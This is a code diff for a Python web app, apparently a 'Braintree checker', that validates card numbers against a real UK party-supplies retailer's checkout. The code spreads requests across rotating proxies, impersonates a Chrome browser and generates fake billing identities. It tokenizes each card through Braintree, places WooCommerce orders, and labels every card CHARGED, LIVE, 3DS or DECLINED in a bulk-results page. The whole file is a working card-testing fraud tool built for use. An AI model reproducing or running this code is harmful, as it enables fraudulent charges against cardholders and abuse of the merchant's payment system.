@@ -12,7 +12,6 @@ from concurrent.futures import ThreadPoolExecutor, as_completed
 from pathlib import Path
 from fastapi import FastAPI, Form, Request
 from fastapi.responses import HTMLResponse
-from fastapi.templating import Jinja2Templates
 import requests
 import urllib3
 from curl_cffi import requests as cffi
@@ -21,10 +20,6 @@ from faker import Faker
 urllib3.disable_warnings()
 
 app = FastAPI(title="Ollie Partyrama Braintree Checker")
-
-templates_dir = Path("templates")
-templates_dir.mkdir(exist_ok=True)
-templates = Jinja2Templates(directory="templates")
 
 HOST = "https://www.partyrama.co.uk"
 UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
@@ -178,143 +173,136 @@ def classify(reason, wc_result):
     if any(k in m for k in ("insufficient", "cvv", "cvc", "security code")): return "LIVE"
     return "DECLINED"
 
-def _try_once(card, pool):
-    ident = gen_identity()
-    session_id = str(uuid.uuid4())
-    sess = cffi.Session(impersonate="chrome124", timeout=30)
-    sess.trust_env = False
-    prox = pool.next_dict()
-
-    sess.get(HOST + "/", proxies=prox, timeout=15)
-    sess.get(PRODUCT_URL, proxies=prox, timeout=15)
-    co = sess.get(CHECKOUT_URL, proxies=prox, timeout=20, allow_redirects=True)
-    if "/checkout" not in co.url:
-        raise Exception("checkout redirected")
-    html = co.text
-
-    fingerprint = extract_fingerprint(html)
-    if not fingerprint:
-        ajax_resp = sess.get(AJAX_TOKEN_URL, proxies=prox, timeout=10)
-        if ajax_resp.status_code == 200:
-            fingerprint = ajax_resp.json().get("authorizationFingerprint")
-
-    cart_key = extract_cart_key(html)
-    shipping = extract_shipping(html)
-    wc_nonce = extract_checkout_nonce(html)
-    config_data = extract_config_json(html)
-    total = extract_total(html)
-
-    if not fingerprint:
-        return ("DECLINED", "No fingerprint found", total)
-    if not wc_nonce or not cart_key:
-        return ("DECLINED", "No nonce or cart key", total)
-
-    tp = {
-        "clientSdkMetadata": {"source": "client", "integration": "dropin2", "sessionId": session_id},
-        "query": TOKENIZE_QUERY,
-        "variables": {"input": {"creditCard": {"number": card["cc"], "expirationMonth": card["mm"], "expirationYear": card["yy"], "cvv": card["cvv"]}, "options": {"validate": False}}},
-        "operationName": "TokenizeCreditCard",
-    }
-    bt = requests.post(BT_GRAPHQL, json=tp, proxies=prox, headers={
-        "authorization": "Bearer " + fingerprint,
-        "braintree-version": BT_VERSION,
-        "content-type": "application/json",
-        "origin": "https://assets.braintreegateway.com",
-        "referer": "https://assets.braintreegateway.com/",
-        "user-agent": UA,
-    }, timeout=15, verify=False)
-    
-    bj = bt.json()
-    nonce_token = (bj.get("data") or {}).get("tokenizeCreditCard", {}).get("token")
-    if not nonce_token:
-        err = bj.get("errors") or bj.get("error") or "no token"
-        return ("DECLINED", f"tokenize: {extract_reason(str(err))}", total)
-
-    card_info = (bj.get("data") or {}).get("tokenizeCreditCard", {}).get("creditCard") or {}
-    bin6 = card_info.get("bin", card["cc"][:6])
-
-    three_ds_payload = {
-        "amount": total, "browserColorDepth": 24, "browserJavaEnabled": False,
-        "browserJavascriptEnabled": True, "browserLanguage": "en-GB",
-        "browserScreenHeight": 1080, "browserScreenWidth": 1920, "browserTimeZone": 0,
-        "deviceChannel": "Browser",
-        "additionalInfo": {
-            "shippingGivenName": ident["first_name"], "shippingSurname": ident["last_name"],
-            "ipAddress": "0.0.0.0", "billingLine1": ident["address_1"], "billingCity": ident["city"],
-            "billingState": ident["state"], "billingPostalCode": ident["postcode"],
-            "billingCountryCode": "GB", "billingPhoneNumber": ident["phone"], "email": ident["email"],
-        },
-        "bin": bin6, "dfReferenceId": "0_" + str(uuid.uuid4()),
-        "clientMetadata": {"requestedThreeDSecureVersion": "2", "sdkVersion": "web/3.144.0"},
-        "authorizationFingerprint": fingerprint, "braintreeLibraryVersion": "braintree/web/3.144.0",
-        "_meta": {"merchantAppId": "partyrama.co.uk", "platform": "web", "sdkVersion": "3.144.0", "source": "client", "integration": "custom", "sessionId": session_id},
-    }
-    ds = requests.post(f"{BT_3DS_BASE}/{nonce_token}/three_d_secure/lookup", proxies=prox, json=three_ds_payload, headers={
-        "accept": "*/*", "content-type": "application/json", "origin": HOST, "referer": HOST + "/", "user-agent": UA,
-    }, verify=False, timeout=15)
-
-    lookup_nonce = None
-    trans_status = None
-    try:
-        dsj = ds.json()
-        pm = dsj.get("paymentMethod") or {}
-        lookup_nonce = pm.get("nonce") or None
-        lookup_obj = (pm.get("threeDSecureInfo") or {}).get("lookup") or dsj.get("lookup") or {}
-        trans_status = lookup_obj.get("transStatus")
-    except Exception:
-        pass
-
-    if trans_status in ("C", "R", "A", "U", "D"):
-        return ("3DS", f"3DS:{trans_status} challenge required", total)
-
-    charge_nonce = lookup_nonce if lookup_nonce else nonce_token
-    device_data = json.dumps({"correlation_id": session_id})
-
-    wc_body = {
-        "billing_first_name": ident["first_name"], "billing_last_name": ident["last_name"],
-        "billing_company": ident["company"], "billing_country": ident["country"],
-        "billing_address_1": ident["address_1"], "billing_address_2": ident["address_2"],
-        "billing_city": ident["city"], "billing_state": ident["state"],
-        "billing_postcode": ident["postcode"], "billing_phone": ident["phone"],
-        "billing_email": ident["email"], "shipping_method[0]": shipping,
-        "payment_method": "braintree_cc", "braintree_cc_nonce_key": charge_nonce,
-        "braintree_cc_device_data": device_data, "braintree_cc_3ds_nonce_key": "",
-        "braintree_cc_config_data": config_data or "", "terms": "on",
-        "woocommerce-process-checkout-nonce": wc_nonce,
-    }
-
-    rr = sess.post(HOST + "/?wc-ajax=checkout", data=wc_body, proxies=prox, timeout=20)
-    jj = rr.json()
-    wc_result = str(jj.get("result", "")).lower()
-    if wc_result == "success":
-        redirect = jj.get("redirect") or ""
-        m = re.search(r"order-received/(\d+)", redirect)
-        oid = m.group(1) if m else "?"
-        return ("CHARGED", f"order_id={oid}", total)
-
-    reason = extract_reason(jj.get("messages") or "")
-    status = classify(reason, wc_result)
-    return (status, reason, total)
-
 def run_single_card(card_line, pool):
     parts = [p.strip() for p in re.split(r"[|:/\\\s-]+", card_line) if p.strip()]
     if len(parts) < 4: return {"card": card_line, "status": "INVALID", "reason": "Invalid Format"}
     cc, mm, yy, cvv = parts[0], parts[1].zfill(2), parts[2], parts[3]
     yy = yy if len(yy) == 4 else "20" + yy[-2:]
-    masked = f"{cc}|{mm}|{yy}|{cvv}"
-    card = {"cc": cc, "mm": mm, "yy": yy, "cvv": cvv}
+    masked = f"{cc[:6]}******{cc[-4:]}|{mm}|{yy}|{cvv}"
 
-    for _ in range(2):
-        try:
-            st, rsn, tot = _try_once(card, pool)
-            return {"card": masked, "status": st, "reason": rsn}
-        except Exception:
-            time.sleep(0.3)
-    return {"card": masked, "status": "ERROR", "reason": "Connection/Proxy Failed"}
+    ident = gen_identity()
+    session_id = str(uuid.uuid4())
+    sess = cffi.Session(impersonate="chrome124", timeout=30)
+    sess.trust_env = False
+
+    try:
+        prox = pool.next_dict()
+        sess.get(HOST + "/", proxies=prox, timeout=15)
+        sess.get(PRODUCT_URL, proxies=prox, timeout=15)
+        co = sess.get(CHECKOUT_URL, proxies=prox, timeout=20, allow_redirects=True)
+        html = co.text
+
+        fingerprint = extract_fingerprint(html)
+        if not fingerprint:
+            ajax_resp = sess.get(AJAX_TOKEN_URL, proxies=prox, timeout=10)
+            if ajax_resp.status_code == 200:
+                fingerprint = ajax_resp.json().get("authorizationFingerprint")
+
+        if not fingerprint:
+            return {"card": masked, "status": "DEAD", "reason": "No fingerprint found"}
+
+        cart_key = extract_cart_key(html)
+        shipping = extract_shipping(html)
+        wc_nonce = extract_checkout_nonce(html)
+        config_data = extract_config_json(html)
+        total = extract_total(html)
+
+        tp = {
+            "clientSdkMetadata": {"source": "client", "integration": "dropin2", "sessionId": session_id},
+            "query": TOKENIZE_QUERY,
+            "variables": {"input": {"creditCard": {"number": cc, "expirationMonth": mm, "expirationYear": yy, "cvv": cvv}, "options": {"validate": False}}},
+            "operationName": "TokenizeCreditCard",
+        }
+        bt = requests.post(BT_GRAPHQL, json=tp, proxies=prox, headers={
+            "authorization": "Bearer " + fingerprint,
+            "braintree-version": BT_VERSION,
+            "content-type": "application/json",
+            "origin": "https://assets.braintreegateway.com",
+            "user-agent": UA,
+        }, timeout=15, verify=False)
+        
+        bj = bt.json()
+        nonce_token = (bj.get("data") or {}).get("tokenizeCreditCard", {}).get("token")
+        if not nonce_token:
+            err = bj.get("errors") or "no token"
+            return {"card": masked, "status": "DECLINED", "reason": extract_reason(str(err))}
+
+        wc_body = {
+            "billing_first_name": ident["first_name"], "billing_last_name": ident["last_name"],
+            "billing_country": ident["country"], "billing_address_1": ident["address_1"],
+            "billing_city": ident["city"], "billing_state": ident["state"],
+            "billing_postcode": ident["postcode"], "billing_phone": ident["phone"],
+            "billing_email": ident["email"], "shipping_method[0]": shipping,
+            "payment_method": "braintree_cc", "braintree_cc_nonce_key": nonce_token,
+            "braintree_cc_config_data": config_data or "", "terms": "on",
+            "woocommerce-process-checkout-nonce": wc_nonce,
+        }
+
+        rr = sess.post(HOST + "/?wc-ajax=checkout", data=wc_body, proxies=prox, timeout=20)
+        jj = rr.json()
+        wc_result = str(jj.get("result", "")).lower()
+        if wc_result == "success":
+            return {"card": masked, "status": "CHARGED", "reason": "Order Successful"}
+        
+        reason = extract_reason(jj.get("messages") or "")
+        status = classify(reason, wc_result)
+        return {"card": masked, "status": status, "reason": reason}
+    except Exception as e:
+        return {"card": masked, "status": "ERROR", "reason": str(e)[:50]}
 
 @app.get("/", response_class=HTMLResponse)
 async def index(request: Request):
-    return templates.TemplateResponse(request, "index.html", {"results": None, "proxy_stats": None})
+    return """<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Ollie Partyrama Braintree Checker v5.1</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+</head>
+<body class="bg-slate-950 text-white min-h-screen p-6">
+    <main class="max-w-4xl mx-auto space-y-6">
+        <div class="flex flex-wrap items-center justify-between border-b border-slate-800 pb-4 gap-2">
+            <div>
+                <h1 class="text-2xl font-bold text-emerald-400">Partyrama Braintree Checker</h1>
+                <p class="text-xs text-slate-400 font-mono">Braintree Custom Integration + Proxy Auto-Prune & Threads</p>
+            </div>
+        </div>
+
+        <div class="bg-slate-900 rounded-xl p-5 space-y-4 shadow-xl border border-slate-800">
+            <form method="POST" action="/check" id="checkerForm" class="space-y-4">
+                <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+                    <div>
+                        <label class="block text-xs font-medium text-slate-400 mb-1">Proxy Threads</label>
+                        <input id="proxyThreads" name="proxy_threads" type="number" value="20" min="1" max="100" class="w-full bg-slate-950 border border-slate-700 rounded-lg p-2 text-xs font-mono text-center text-emerald-300">
+                    </div>
+                    <div>
+                        <label class="block text-xs font-medium text-slate-400 mb-1">Card Threads</label>
+                        <input id="cardThreads" name="card_threads" type="number" value="5" min="1" max="20" class="w-full bg-slate-950 border border-slate-700 rounded-lg p-2 text-xs font-mono text-center text-emerald-300">
+                    </div>
+                </div>
+
+                <div class="space-y-2">
+                    <label class="block text-xs font-medium text-slate-400">Proxy List (host:port:user:pass o http://...)</label>
+                    <textarea id="proxyInput" name="proxies" rows="3" placeholder="http://user:pass@host:port"
+                        class="w-full bg-slate-950 border border-slate-700 rounded-lg p-3 text-xs font-mono focus:ring-2 focus:ring-emerald-500 focus:outline-none"></textarea>
+                </div>
+
+                <div class="space-y-2">
+                    <label class="block text-xs font-medium text-slate-400">Cards List (CC|MM|YY|CVV)</label>
+                    <textarea id="cardInput" name="cards" rows="4" placeholder="548809...|04|27|913" required
+                        class="w-full bg-slate-950 border border-slate-700 rounded-lg p-3 text-xs font-mono focus:ring-2 focus:ring-emerald-500 focus:outline-none"></textarea>
+                </div>
+
+                <button type="submit" id="checkButton"
+                    class="bg-emerald-600 hover:bg-emerald-500 px-5 py-3 rounded-lg font-semibold w-full transition shadow-lg shadow-emerald-950/50">
+                    Simulan ang Pagsusuri ng mga Kard
+                </button>
+            </form>
+        </div>
+    </main>
+</body>
+</html>"""
 
 @app.post("/check", response_class=HTMLResponse)
 async def check_cards(
@@ -327,26 +315,63 @@ async def check_cards(
     card_list = [line.strip() for line in cards.splitlines() if line.strip()]
     raw_proxies = [line.strip() for line in proxies.splitlines() if line.strip()]
 
-    # 1. Check & Clean Proxies (Auto-remove dead proxies)
-    total_proxies = len(raw_proxies)
+    # Auto-prune dead proxies bago isalang ang mga card
     alive_proxies = check_and_clean_proxies(raw_proxies, threads=proxy_threads)
-    dead_count = total_proxies - len(alive_proxies)
     pool = ProxyPool(alive_proxies)
 
     proxy_stats = {
-        "total": total_proxies,
+        "total": len(raw_proxies),
         "alive": len(alive_proxies),
-        "dead": dead_count
+        "dead": len(raw_proxies) - len(alive_proxies)
     }
 
-    # 2. Check Cards using multi-threading
     results = []
     with ThreadPoolExecutor(max_workers=max(1, card_threads)) as ex:
         futures = [ex.submit(run_single_card, card, pool) for card in card_list]
         for f in as_completed(futures):
             results.append(f.result())
 
-    return templates.TemplateResponse(request, "index.html", {
-        "results": results, 
-        "proxy_stats": proxy_stats
-    })
+    # HTML rendering na may modernong disenyo para sa mga resulta at detalye ng card
+    results_html = ""
+    for r in results:
+        badge_color = "bg-rose-500 text-white"
+        if r['status'] == 'CHARGED': badge_color = "bg-emerald-500 text-black"
+        elif r['status'] == 'AVS': badge_color = "bg-teal-500 text-black"
+        elif r['status'] == 'LIVE': badge_color = "bg-amber-500 text-black"
+        elif r['status'] == '3DS': badge_color = "bg-purple-500 text-white"
+
+        results_html += f"""
+        <div class="bg-slate-950 border border-slate-800 p-3 rounded-lg flex items-center justify-between font-mono text-xs">
+            <div>
+                <span class="px-2 py-1 rounded font-bold {badge_color}">{r['status']}</span>
+                <span class="text-sky-400 ml-2">{r['card']}</span>
+            </div>
+            <span class="text-slate-400">{r['reason']}</span>
+        </div>"""
+
+    return f"""<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Resulta - Partyrama Braintree Checker</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+</head>
+<body class="bg-slate-950 text-white min-h-screen p-6">
+    <main class="max-w-4xl mx-auto space-y-6">
+        <div class="flex items-center justify-between border-b border-slate-800 pb-4">
+            <h1 class="text-2xl font-bold text-emerald-400">Resulta ng Pagsusuri</h1>
+            <a href="/" class="bg-slate-800 hover:bg-slate-700 text-xs px-4 py-2 rounded-lg font-semibold transition">Bumalik</a>
+        </div>
+
+        <div class="bg-slate-900 rounded-xl p-5 space-y-4 shadow-xl border border-slate-800">
+            <div class="text-xs text-slate-400 font-mono">
+                Proxy Report: Total: {proxy_stats['total']} | <span class="text-emerald-400">Live: {proxy_stats['alive']}</span> | <span class="text-rose-400">Dead: {proxy_stats['dead']}</span>
+            </div>
+            <div class="space-y-2 max-h-[500px] overflow-y-auto">
+                {results_html if results_html else '<p class="text-slate-500 text-xs">Walang nakitang resulta.</p>'}
+            </div>
+        </div>
+    </main>
+</body>
+</html>"""
